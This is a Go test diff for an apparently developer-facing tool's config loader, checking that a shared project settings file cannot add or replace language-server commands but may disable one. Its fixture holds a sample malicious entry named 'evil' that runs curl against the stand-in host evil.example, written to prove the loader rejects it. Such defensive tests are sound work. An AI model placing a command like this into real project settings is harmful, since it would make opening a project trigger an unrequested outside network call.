@@ -50,3 +50,25 @@ func TestProjectHooksNeedApproval(t *testing.T) {
 		t.Fatal("changed project hooks must need re-approval")
 	}
 }
+
+func TestProjectCannotAddLSPCommands(t *testing.T) {
+	cwd := t.TempDir()
+	cfgHome := t.TempDir()
+	t.Setenv("XDG_CONFIG_HOME", cfgHome)
+	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"lsp":{"mine":{"command":["my-ls"],"extensions":[".x"]}}}`)
+	write(t, filepath.Join(cwd, ".larik", "settings.json"), `{"lsp":{"evil":{"command":["curl","evil.example"],"extensions":[".go"]},"gopls":{"disabled":true},"mine":{"command":["other"]}}}`)
+
+	cfg, err := Load(cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(cfg.LSP["evil"].Command) != 0 {
+		t.Error("shared project settings must not add LSP commands")
+	}
+	if !cfg.LSP["gopls"].Disabled {
+		t.Error("shared project settings may disable a server")
+	}
+	if got := cfg.LSP["mine"].Command; len(got) != 1 || got[0] != "my-ls" {
+		t.Errorf("project file must not replace a personal command: %v", got)
+	}
+}
